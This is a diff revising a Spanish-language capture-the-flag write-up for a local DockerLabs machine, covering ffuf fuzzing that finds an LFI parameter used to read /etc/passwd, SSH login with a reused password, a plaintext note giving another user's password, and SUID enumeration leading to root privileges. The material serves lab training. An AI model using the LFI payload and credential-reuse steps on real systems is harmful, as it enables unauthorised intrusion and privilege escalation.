@@ -84,13 +84,13 @@ El mensaje indica que existe un archivo llamado `balu` en algún lugar del siste
 
 ![](assets/Pasted%20image%2020251109150235.png)
 
-- Encuentro la contraseña: `balu`
+- Encuentro un texto que dice: `balu`
 
 ## Explotación
 
 ### Local File Inclusion (LFI)
 
-La aplicación web parece tener capacidad para listar archivos. Decido fuzzear el archivo `index.php` para descubrir parámetros vulnerables que permitan leer archivos arbitrarios.
+Sin mucha mas informacion opte por fuzzear por parametros en los recursos de la web y descubri lo siguiente.
 
 ```bash
 > ffuf -w raft-large-directories.txt:FUZZ -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -fw 12
@@ -98,19 +98,24 @@ La aplicación web parece tener capacidad para listar archivos. Decido fuzzear e
 page   [Status: 200, Size: 1367, Words: 11, Lines: 27, Duration: 2ms]
 ```
 
-- Descubro el parámetro `page` vulnerable a LFI.
+- Al parecer la web puede listar archivos abusando del parametro `?page` en el recurso `index.php`.
 
-Ahora puedo leer archivos del sistema accediendo a `http://172.17.0.2/index.php?page=/etc/passwd`.
+Ahora puedo leer archivos del sistema accediendo a `http://172.17.0.2/index.php?page=<archivo>`.
+
+- En este caso lei el `/etc/passwd`
 
 ![](assets/Pasted%20image%2020251109151030.png)
 
-Del archivo `/etc/passwd` identifico dos usuarios del sistema:
+El archivo `/etc/passwd` me muestra dos usuarios del sistema:
+
 - `pinguino`
 - `mario`
 
 ### Acceso SSH
 
-Con la contraseña `balu` encontrada anteriormente y los usuarios identificados, intento acceder por SSH.
+Al tratar de reutilizar el texto `balu` como contraseña para alguno de estos 2 usuarios descubri que era la contraseña para el usuario pinguino.
+
+- pinguino / balu
 
 ```bash
 > ssh pinguino@172.17.0.2
@@ -123,13 +128,12 @@ pinguino@dockerlabs:~$ id
 uid=1000(pinguino) gid=1000(pinguino) groups=1000(pinguino)
 ```
 
-- Acceso exitoso con las credenciales `pinguino:balu`
 
 ## Escalada de Privilegios
 
 ### Migración al usuario mario
 
-Dentro del sistema encuentro un archivo que revela la contraseña del usuario `mario`.
+En mi directorio home encuentro un archivo que revela la contraseña del usuario `mario`.
 
 ```bash
 > pinguino@dockerlabs:~$ ls
@@ -138,9 +142,8 @@ pinguino@dockerlabs:~$ cat nota_mario.txt
 La contraseña de mario es: invitaacachopo
 ```
 
-- Contraseña de mario: `invitaacachopo`
 
-Migro al usuario `mario` con la contraseña encontrada.
+Con esa contraseña puedo migrar al usuario mario.
 
 ```bash
 > pinguino@dockerlabs:~$ su mario
@@ -151,7 +154,7 @@ mario
 
 ### Abuso de SUID para Escalada a Root
 
-Busco binarios con permisos SUID que puedan ser explotados para escalar privilegios.
+Ahora me decidi por enumerar binarios con permisos SUID y encontre lo siguiente:
 
 ```bash
 > mario@dockerlabs:/home$ find / -perm -4000 2>/dev/null
@@ -174,7 +177,5 @@ uid=1001(mario) gid=1001(mario) euid=0(root) groups=1001(mario)
 El output muestra:
 - `uid=1001(mario)`: Identidad real del usuario (mario)
 - `euid=0(root)`: Privilegios efectivos (root)
-
-Esto significa que aunque la identidad real sigue siendo mario, los privilegios efectivos son de root, lo que permite ejecutar comandos con permisos de superusuario.
 
 ***PWNED***
